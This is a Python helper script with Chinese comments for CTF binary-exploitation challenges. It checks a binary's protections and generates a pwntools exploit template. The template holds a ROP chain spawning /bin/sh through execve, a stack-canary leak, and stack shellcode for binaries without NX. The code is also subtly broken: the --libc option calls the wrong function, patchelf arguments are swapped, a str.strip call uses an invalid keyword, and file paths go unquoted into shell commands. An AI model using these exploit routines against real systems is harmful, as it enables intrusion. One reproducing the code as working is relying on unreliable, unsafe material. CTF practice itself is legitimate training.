#!/usr/bin/env python3

# 坐牢自动化v2.0
# 这是一个打pwn使用的python脚本工具，用于自动分析文件以及加载动态文件


# 加载到系统方法:
# chmod +x ./pwn.py
# sudo cp pwn.py /usr/local/bin/pwn
# 使用方法： pwn ./pwnfile
# 删除方法: sudo mv /usr/local/bin/pwn

# 使用系统命令,没有装的装一下
# file
# checksec
# chmod
# ldd
# ROPgadget
# patchelf


import argparse
from ast import arg
import subprocess
import os
from colorama import Fore, Back, Style, init

# 基本文件特征
fileInformationDict: dict[str, str] = {
    "ELF": "可执行文件(ELF)",
    "64-bit": Fore.RED + "64位文件" + Fore.WHITE,
    "32-bit": "32位文件",
    "LSB": "小端序",
    "BSB": "大端序",
}

# 文件保护信息
fileProtectionInformationDict: dict[str, str] = {
    "Partial RELRO": Fore.RED + "可写GOT表" + Fore.WHITE,
    "Full RELR": Fore.GREEN + "不可写GOT表" + Fore.WHITE,
    "Canary found": Fore.GREEN + "有金丝雀" + Fore.WHITE,
    "No canary found": Fore.RED + "无金丝雀" + Fore.WHITE,
    "NX disabled": Fore.RED + "栈可运行" + Fore.WHITE,
    "NX enabled": Fore.GREEN + "栈不可运行" + Fore.WHITE,
    "NX unknown": Fore.RED + "栈有可能可运行" + Fore.WHITE,
    "Executable": Fore.RED + "栈可运行" + Fore.WHITE,
    "PIE enabled": Fore.GREEN + "随机位置(PIE)开启" + Fore.WHITE,
    "No PIE": Fore.RED + "固定位置" + Fore.WHITE,
    "Has RWX segments": Fore.RED +"存在可读写可执行的内存段"+ Fore.WHITE,
}

# 获取环境参数
# 使用方法:args.pwn_path
def getFile() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description='自动分析pwn文件工具')
    # 位置参数
    parser.add_argument('file_path', type=str, help='pwn 工具的路径')
    # 可选参数
    parser.add_argument('--os', type=str, required=False,
                        help='指定 libc文件(一般以.os 结尾)')
    parser.add_argument('--libc', type=str, required=False,
                        help='指定 链接文件(一般以.os.数字 结尾)')

    args: argparse.Namespace = parser.parse_args()
    return args

# 运行命令
def runShell(cmd: str) -> list[bytes]:
    res = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    resList: list[bytes] = res.stdout.readlines()
    res.stdout.close()
    return resList

# 使用file命令获取文件基本信息
def getFileInformation(file_path: str) -> list[str]:
    resStr: str = runShell(cmd="file {}".format(file_path))[0].decode()
    retList: list[str] = []
    for i in fileInformationDict:
        if i in resStr:
            print(fileInformationDict.get(i, "未知参数"), end=" ")
            retList.append(i)
    print()
    return retList

#  检查保护
def checksec(file_path: str) -> list[str]:
    resList_raw: list[bytes] = runShell(
        cmd="checksec --file={}".format(file_path))
    
    resList:list[str] = []
    for i in resList_raw:
        resList.append(i.decode())

    retList: list[str] = []

    for i in resList:
        for x in fileProtectionInformationDict:
            if x in i:
                print("{:50}=> {}".format(i.strip("\n"),fileProtectionInformationDict.get(x,"未找到")))
                retList.append(x)
                break
        else:
            print("{:50}=> {}".format(i.strip("\n"),"未找到"))

    return retList

# 检查动态库并且进行修补
def setLibcFile(args: argparse.Namespace) -> None:
    print("修补libc文件中")
    runShell(cmd="patchelf --set-interpreter {} {}".format(args.file_path, args.os))

# 检查链接文件并且进行修补
def setLinkFile(args: argparse.Namespace) -> None:
    print("修补链接文件中")
    resList: list[bytes] = runShell(cmd="ldd {}".format(args.file_path))
    for i in resList:
        if "=>" in i.decode():
            old_list: str = i.decode().split(sep="=>")[0].strip(chars=" ")
            break
    runShell(cmd="patchelf --replace-needed {} {} {}".format(old_list,
             args.libc, args.file_path))

# 检查动态库什么的
def ldd(args: argparse.Namespace):
    print("\n检查动态库:")
    resList: list[bytes] = runShell(cmd="ldd {}".format(args.file_path))
    for i in resList:
        print(i.decode(), end="")
    print()

# 生成传参工具
def x64tools(args: argparse.Namespace) -> None:
    print("已经生成了传参小工具在:tools.txt里")
    runShell(cmd="ROPgadget --binary {} > tools.txt".format(args.file_path))

# 生成基础py文件
def makePyFile(args: argparse.Namespace, fileList: list[str]) -> None:

    # 检查文件是否已存在
    if os.path.exists("tool.py"):
        print(Fore.RED + "文件tool.py 已存在，未执行任何操作。")
        return

    pyFile: str = """
from pwn import *
context(os='linux', arch='AMD64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')

io = process('{}')
file = ELF('{}')
# io = remote('127.0.0.1', 21)





# 接收直到A
io.recvuntil(b'A')
# 接收指定字节数
data = io.recv(numb=6)
# 发送数据
io.send(data)

#获取shell
io.interactive()
""".format(args.file_path, args.file_path)
    if "64-bit" in fileList:
        pyFile += """


#寄存器传参
# 放入顺序 rdi, rsi, rdx, rcx, r8, r9
def amd64(io):
    payload = flat([
    file.search(asm('pop rax; ret;')).__next__(),  # rax => 返回数据寄存器(设置进程号)
    59,  # syscall的系统调用编号
    file.search(asm('pop rdi; ret;')).__next__(),  # 参数1 => /bin/sh
    file.search(b'/bin/sh').__next__(),
    file.search(asm('pop rsi; ret;')).__next__(),  # 参数2 => 参数数组
    0,
    file.search(asm('pop rdx; ret')).__next__(),  # 参数3 => 环境变量数组
    0,
    file.search(asm('syscall')).__next__()  # 系统调用
    ])

#寻找函数
def findFun(file,libc):
    file.got['puts'] #找got表
    file.plt['puts'] #找plt表
    file.sym['puts'] #找system表

    libc.symbols['puts'] #找symbols表
    libc.search(b'/bin/sh').__next__() #找含有/bin/sh的地址
    libc.search(asm('pop rdi; ret;')).__next__() #找寄存器妙妙小工具

"""
    if "Canary found" in fileList:
        pyFile += """

# 泄露金丝雀法

def canary(io):
    #把0x20换成溢出的变量位置
    io.send(b'a'*(0x20-0x8)+b'G')
    io.recvuntil(b'G')
    # 泄露金丝雀
    canary_data = u64(b'\\x00'+io.recv(7))
    canary_arr = p64(canary_data)
    print("金丝雀=> {:8x} ".format(canary_data))
"""
    if "NX disabled" in fileList:
        pyFile += """

#没有任何检查关闭 NX 保护直接执行栈上 shellcode（直接输入）
def nx(io):
    io.send(asm(shellcraft.sh()))
"""

    # 使用 Python 文件操作写入文件
    print("正在生成基础文件到: tool.py")
    with open("tool.py", "w") as file:
        file.write(pyFile)
    print("tool.py 已生成。")


# 给运行权限
def runX(args: argparse.Namespace) -> None:
    print("已经给了运行权限")
    runShell(cmd="chmod +x {}".format(args.file_path))

# 主要运行函数
def main() -> None:

    args: argparse.Namespace = getFile()
    fileList: list[str] = []

    # 文件基本信息
    print("\n文件：{}\n".format(args.file_path))
    fileList += getFileInformation(file_path=args.file_path)
    fileList += checksec(file_path=args.file_path)

    # 修补程序
    ldd(args=args)
    if args.os != None:
        setLibcFile(args=args)
    if args.libc != None:
        setLibcFile(args=args)
    x64tools(args=args)

    # 运行权限
    runX(args=args)

    # 生成py基础脚本
    makePyFile(args=args, fileList=fileList)


if __name__ == "__main__":
    main()
